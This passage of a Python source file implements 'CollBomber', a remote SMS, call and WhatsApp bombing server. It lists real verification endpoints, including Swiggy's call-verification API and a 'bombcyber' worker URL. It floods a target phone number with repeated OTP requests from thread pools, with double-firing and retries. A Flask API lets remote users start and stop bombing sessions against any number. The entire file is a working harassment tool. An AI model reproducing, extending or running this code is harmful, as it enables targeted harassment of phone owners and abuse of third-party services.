CALL_APIS = [a for a in ALL_APIS if a.category == "call"]
SMS_APIS = [a for a in ALL_APIS if a.category == "sms"]
WHATSAPP_APIS = [a for a in ALL_APIS if a.category == "whatsapp"]

IMPORTANT_CALL_APIS = [
    ApiConfig("Swiggy_Call", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
              {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
    ApiConfig("Swiggy_Call_Verification", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
              {"Content-Type": "application/json; charset=utf-8"}, '{"mobile":"{phone}"}', "call"),
]
IMPORTANT_5S_APIS = [
    ApiConfig("ThakurBombCyber_5s", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET",
              {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, None, "sms"),
]

# ========== BOMBER ENGINE ==========
class RemoteBomber:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        self.sms_executor = ThreadPoolExecutor(max_workers=SMS_MAX_WORKERS)
        import requests as req_lib
        self.http_session = req_lib.Session()
        self.http_session.mount('https://', req_lib.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=0))
        self.http_session.mount('http://', req_lib.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=0))

    def _fire_api(self, api, phone):
        try:
            import requests as req_lib
            req = api.build_request(phone)
            resp = self.http_session.send(req.prepare(), timeout=10, allow_redirects=False)
            status = resp.status_code
            size = len(resp.content)
            return api.name, status, size, None
        except Exception as e:
            return api.name, 0, 0, str(e)[:60]

    def _run_round(self, phone, apis, stats, is_sms=False):
        executor = self.sms_executor if is_sms else self.executor
        fire_count = 2 if (is_sms and SMS_DOUBLE_FIRE) else 1
        futures = []
        for api in apis:
            if api.delay_ms > 0:
                time.sleep(api.delay_ms / 1000.0)
            for _ in range(fire_count):
                futures.append(executor.submit(self._fire_api, api, phone))
        ok_count = 0
        fail_count = 0
        failed_apis = []
        for f in as_completed(futures):
            name, status, size, err = f.result()
            if 200 <= status < 400 and size > 0:
                ok_count += 1
            else:
                fail_count += 1
                failed_apis.append(name)
        if is_sms and SMS_AUTO_RETRY and failed_apis:
            retry_futures = []
            for api in apis:
                if api.name in failed_apis[:30]:
                    retry_futures.append(executor.submit(self._fire_api, api, phone))
            for f in as_completed(retry_futures):
                name, status, size, err = f.result()
                if 200 <= status < 400 and size > 0:
                    ok_count += 1
                else:
                    fail_count += 1
        return ok_count, fail_count

    def _worker(self, session_id, phone, mode, stop_event):
        if mode == "call":
            apis = CALL_APIS
        elif mode == "whatsapp":
            apis = WHATSAPP_APIS
        elif mode == "sms":
            apis = SMS_APIS
        else:
            apis = ALL_APIS

        round_num = 0
        is_sms_mode = (mode == "sms")
        round_delay = SMS_DELAY_BETWEEN_ROUNDS if is_sms_mode else DELAY_BETWEEN_ROUNDS

        while not stop_event.is_set():
            round_num += 1
            try:
                ok, fail = self._run_round(phone, apis, {}, is_sms=is_sms_mode)
                with self.lock:
                    if session_id in self.sessions:
                        self.sessions[session_id]["stats"]["ok"] += ok
                        self.sessions[session_id]["stats"]["fail"] += fail
                        self.sessions[session_id]["stats"]["rounds"] += 1
                        self.sessions[session_id]["stats"]["total"] += ok + fail
            except:
                pass
            time.sleep(round_delay)

    def _important_worker(self, session_id, phone, stop_event):
        while not stop_event.is_set():
            try:
                futures = []
                for api in IMPORTANT_CALL_APIS:
                    futures.append(self.executor.submit(self._fire_api, api, phone))
                for f in as_completed(futures):
                    name, status, size, err = f.result()
                    with self.lock:
                        if session_id in self.sessions:
                            if 200 <= status < 400 and size > 0:
                                self.sessions[session_id]["stats"]["ok"] += 1
                            else:
                                self.sessions[session_id]["stats"]["fail"] += 1
                            self.sessions[session_id]["stats"]["total"] += 1
            except:
                pass
            time.sleep(IMPORTANT_CALL_INTERVAL)

    def _important_five_second_worker(self, session_id, phone, stop_event):
        while not stop_event.is_set():
            try:
                futures = []
                for api in IMPORTANT_5S_APIS:
                    futures.append(self.executor.submit(self._fire_api, api, phone))
                for f in as_completed(futures):
                    name, status, size, err = f.result()
                    with self.lock:
                        if session_id in self.sessions:
                            if 200 <= status < 400 and size > 0:
                                self.sessions[session_id]["stats"]["ok"] += 1
                            else:
                                self.sessions[session_id]["stats"]["fail"] += 1
                            self.sessions[session_id]["stats"]["total"] += 1
            except:
                pass
            time.sleep(IMPORTANT_5S_INTERVAL)

    def start_session(self, session_id, phone, mode):
        with self.lock:
            if session_id in self.sessions:
                return False, "Already running!"
            stop_event = threading.Event()
            stats = {"ok": 0, "fail": 0, "rounds": 0, "total": 0, "start_time": datetime.now().isoformat()}
            self.sessions[session_id] = {
                "phone": phone, "mode": mode, "stop_event": stop_event,
                "stats": stats, "started_at": datetime.now().isoformat()
            }
            thread = threading.Thread(target=self._worker, args=(session_id, phone, mode, stop_event), daemon=True)
            thread.start()
            if mode in ["call", "mix"]:
                imp_thread = threading.Thread(target=self._important_worker, args=(session_id, phone, stop_event), daemon=True)
                imp_thread.start()
            imp5s_thread = threading.Thread(target=self._important_five_second_worker, args=(session_id, phone, stop_event), daemon=True)
            imp5s_thread.start()
            return True, f"Started {mode.upper()} for {phone}"

    def stop_session(self, session_id):
        with self.lock:
            if session_id not in self.sessions:
                return False, "No active session!"
            self.sessions[session_id]["stop_event"].set()
            del self.sessions[session_id]
            return True, "Stopped!"

    def get_session_stats(self, session_id):
        with self.lock:
            if session_id not in self.sessions:
                return None
            s = self.sessions[session_id]
            elapsed = datetime.now() - datetime.fromisoformat(s["started_at"])
            stats = dict(s["stats"])
            stats["elapsed"] = str(elapsed).split('.')[0]
            stats["phone"] = s["phone"]
            stats["mode"] = s["mode"]
            return stats

    def get_status(self):
        with self.lock:
            active = len(self.sessions)
            total_ok = sum(s["stats"]["ok"] for s in self.sessions.values())
            total_fail = sum(s["stats"]["fail"] for s in self.sessions.values())
            return {"active_sessions": active, "total_ok": total_ok, "total_fail": total_fail}

    def stop_all(self):
        count = 0
        with self.lock:
            for sid in list(self.sessions.keys()):
                self.sessions[sid]["stop_event"].set()
                count += 1
            self.sessions.clear()
        return count

bomber = RemoteBomber()


# ========== FLASK API SERVER ==========
try:
    from flask import Flask, request, jsonify
    from flask_cors import CORS
except ImportError:
    print("❌ Install flask: pip install flask flask-cors")
    sys.exit(1)

app = Flask(__name__)
CORS(app)

def verify_auth():
    auth = request.headers.get("Authorization", "")
    token = request.args.get("token", "")
    if auth == f"Bearer {API_AUTH_TOKEN}" or token == API_AUTH_TOKEN:
        return True
    return False

@app.route("/")
def home():
    return jsonify({
        "status": "online",
        "apis": {
            "total": len(ALL_APIS),
            "call": len(CALL_APIS),
            "sms": len(SMS_APIS),
            "whatsapp": len(WHATSAPP_APIS)
        },
        "server": "CollBomber API Server v1.0"
    })

@app.route("/api/start", methods=["POST"])
def api_start():
    if not verify_auth():
        return jsonify({"success": False, "error": "Unauthorized"}), 401
    data = request.json or {}
    session_id = data.get("session_id", str(uuid.uuid4()))
    phone = data.get("phone", "")
    mode = data.get("mode", "sms")
    if not phone or len(phone) < 10:
        return jsonify({"success": False, "error": "Invalid phone number"})
    success, msg = bomber.start_session(session_id, phone, mode)
    return jsonify({"success": success, "message": msg, "session_id": session_id})

@app.route("/api/stop", methods=["POST"])
def api_stop():
    if not verify_auth():
        return jsonify({"success": False, "error": "Unauthorized"}), 401
    data = request.json or {}
    session_id = data.get("session_id", "")
    success, msg = bomber.stop_session(session_id)
    return jsonify({"success": success, "message": msg})

@app.route("/api/stats", methods=["GET"])
def api_stats():
    if not verify_auth():
        return jsonify({"success": False, "error": "Unauthorized"}), 401
    session_id = request.args.get("session_id", "")
    if session_id:
        stats = bomber.get_session_stats(session_id)
        if stats:
            return jsonify({"success": True, "stats": stats})
        return jsonify({"success": False, "error": "Session not found"})
    return jsonify({"success": True, "status": bomber.get_status()})

@app.route("/api/stop_all", methods=["POST"])
def api_stop_all():
    if not verify_auth():
        return jsonify({"success": False, "error": "Unauthorized"}), 401
    count = bomber.stop_all()
    return jsonify({"success": True, "message": f"Stopped {count} sessions"})

@app.route("/api/ping", methods=["GET"])
def api_ping():
    return jsonify({"pong": True, "time": datetime.now().isoformat()})

if __name__ == "__main__":
    print(f"🔥 CollBomber API Server")
    print(f"📊 APIs: {len(ALL_APIS)} (Call: {len(CALL_APIS)}, SMS: {len(SMS_APIS)}, WhatsApp: {len(WHATSAPP_APIS)})")
    print(f"⚡ Workers: {MAX_WORKERS} (SMS: {SMS_MAX_WORKERS})")
    print(f"🔑 Auth Token: {API_AUTH_TOKEN}")
    print(f"🚀 Server running on port {API_PORT}")
    app.run(host="0.0.0.0", port=API_PORT, debug=False, threaded=True)